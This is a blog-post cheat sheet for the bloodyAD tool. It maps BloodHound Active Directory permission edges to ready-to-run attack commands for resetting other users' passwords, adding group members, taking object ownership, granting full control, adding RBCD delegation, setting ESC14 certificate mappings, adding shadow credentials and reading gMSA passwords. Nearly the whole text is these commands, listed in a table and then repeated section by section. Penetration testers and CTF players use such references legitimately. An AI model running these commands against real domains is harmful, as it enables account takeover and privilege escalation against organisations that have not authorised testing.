---
layout: post
title: "bloodyAD Reference Guide"
date: 2025-08-15
categories: CheatSheets
---

#### bloodyAD
 
**Notes**
* Pass -k to use kerberos authentication
* You can pass a user hash instead of a password using -p :hash
* Specify format for ‘–password’ or ‘-k ‘ using -f, e.g. -f rc4
* Can be finicky and may have to update clockskew, attempt commands mult times, as well as attempt exploit chains in rapid succession

##### BloodHound Edges to bloodyAD Commands

| **BloodHound Edge**   | **Action**                             | **bloodyAD Command**                                                                                                                       |
| --------------------- | -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| **GenericAll**        | Full Control                           | `bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username`                                             |
|                       | Reset Password                         | `bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password`                                     |
|                       | Modify UPN                             | `bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user userPrincipalName -v $new_upn`                           |
|                       | Modify Mail                            | `bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user mail -v newmail@test.local`                              |
|                       | Enable Disabled Account                | `bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE`                                   |
|                       | Add RBCD Entry                         | `bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'`                                        |
|                       | Set altSecurityIdentities (ESC14)      | `bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user altSecurityIdentities -v 'X509:<RFC822>user@test.local'` |
|                       | Add to Group                           | `bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add`                                      |
|                       | Set SPN                                | `bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'`                        |
|                       | Set Owner                              | `bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username`                                        |
|                       | Restore Deleted Object                 | `bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore`                                                 |
| **GenericWrite**      | Modify UPN                             | `bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user userPrincipalName -v $new_upn`                           |
|                       | Modify Mail                            | `bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user mail -v newmail@test.local`                              |
|                       | Set altSecurityIdentities              | `bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user altSecurityIdentities -v 'X509:<RFC822>user@test.local'` |
|                       | Set SPN                                | `bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'`                        |
|                       | Enable Disabled Account                | `bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE`                                   |
|                       | Add RBCD Entry                         | `bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'`                                        |
|                       | Reset Password                         | `bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password`                                     |
| **WriteOwner**        | Take Ownership                         | `bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username`                                        |
| **WriteDACL**         | Grant GenericAll                       | `bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username`                                             |
|                       | Add RBCD Entry                         | `bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'`                                        |
|                       | Restore Deleted Object                 | `bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore`                                                 |
| **AddMember**         | Add User to Group                      | `bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add`                                      |
| **AllExtendedRights** | Reset Password                         | `bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password`                                     |
| **AllowedToDelegate** | Set TRUSTED\_TO\_AUTH\_FOR\_DELEGATION | `bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION`                      |
| **ReadProperty**      | Read GMSA Password                     | `bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword`                         |
|                       | Check UPN                              | `bloodyAD --host $dc -d $domain -u $username -p $password get object $target_user --attr userPrincipalName`                                |
| **Other/Utility**     | Retrieve User Info                     | `bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username`                                                     |
|                       | Find Writable Attributes               | `bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail`                                                           |
|                       | Find Deleted Objects                   | `bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del`                                                      |
|                       | Enumerate MachineAccountQuota          | `bloodyAD --host $dc -d $domain -u $username -p $password get object 'DC=dc,DC=dc' --attr ms-DS-MachineAccountQuota`                       |
|                       | Set MAQ Value                          | `bloodyAD --host $dc -d $domain -u $username -p $password set object 'DC=dc,DC=dc' ms-DS-MachineAccountQuota -v 10`                        |
|                       | Create Computer Account                | `bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password`                                  |
|                       | Shadow Credentials                     | `bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target`                                                   |
|                       | Extended Search - Tombstones           | `bloodyAD --host $dc -d $domain -u $username -p $password -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065`             |

---

#####  GenericAll

###### Full Control

```sh
bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username
```

###### Reset Password

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
```

###### Modify UPN

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user userPrincipalName -v $new_upn
```

###### Modify Mail

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user mail -v newmail@test.local
```

###### Enable Disabled Account

```sh
bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
```

###### Add RBCD Entry

```sh
bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
```

###### Set altSecurityIdentities (ESC14)

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user altSecurityIdentities -v 'X509:<RFC822>user@test.local'
```

###### Add to Group

```sh
bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
```

###### Set SPN

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'
```

###### Set Owner

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username
```

###### Restore Deleted Object

```sh
bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
```

##### GenericWrite

###### Modify UPN

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user userPrincipalName -v $new_upn
```

###### Modify Mail

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user mail -v newmail@test.local
```

###### Set altSecurityIdentities

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user altSecurityIdentities -v 'X509:<RFC822>user@test.local'
```

###### Set SPN

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'
```

###### Enable Disabled Account

```sh
bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
```

###### Add RBCD Entry

```sh
bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
```

###### Reset Password

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
```

##### WriteOwner

###### Take Ownership

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username
```

##### WriteDACL

###### Grant GenericAll

```sh
bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username
```

###### Add RBCD Entry

```sh
bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
```

###### Restore Deleted Object

```sh
bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
```

##### AddMember

###### Add User to Group

```sh
bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
```

##### AllExtendedRights

###### Reset Password

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
```

##### AllowedToDelegate

###### Set TRUSTED\_TO\_AUTH\_FOR\_DELEGATION

```sh
bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

##### ReadProperty

###### Read GMSA Password

```sh
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword
```

##### Other/Utility

###### Retrieve User Info

```sh
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username
```

###### Find Writable Attributes

```sh
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
```

###### Find Deleted Objects

```sh
bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del
```

###### Enumerate MachineAccountQuota

```sh
bloodyAD --host $dc -d $domain -u $username -p $password get object 'DC=dc,DC=dc' --attr ms-DS-MachineAccountQuota
```

###### Set MAQ Value

```sh
bloodyAD --host $dc -d $domain -u $username -p $password set object 'DC=dc,DC=dc' ms-DS-MachineAccountQuota -v 10
```

###### Create Computer Account

```sh
bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password
```

###### Shadow Credentials

```sh
bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target
```

###### Extended Search - Tombstones

```sh
bloodyAD --host $dc -d $domain -u $username -p $password -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
```

---

Big thanks to [Serioton](https://seriotonctf.github.io/) for the [BloodyAD Cheatsheet](https://seriotonctf.github.io/BloodyAD-Cheatsheet/index.html) that I based my commands off of <3